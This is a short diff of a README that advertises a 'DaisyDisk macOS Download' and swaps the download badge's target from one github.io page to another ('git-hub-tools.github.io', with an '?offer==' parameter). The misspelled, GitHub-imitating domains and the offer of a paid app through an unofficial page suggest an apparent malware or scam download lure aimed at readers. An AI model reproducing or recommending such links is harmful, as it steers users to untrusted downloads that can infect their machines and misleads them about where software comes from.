@@ -1,6 +1,6 @@
 # DaisyDisk macOS Download — disk space analyzer
 
-[![Get DaisyDisk App](https://img.shields.io/badge/Get%20DaisyDisk%20App-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://dowloader-desktop-app.github.io/.github/?offer==DaisyDisk)  
+[![Get DaisyDisk App](https://img.shields.io/badge/DaisyDisk%20App-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-hub-tools.github.io/.github/?offer==DaisyDisk)  
 
 ---
 
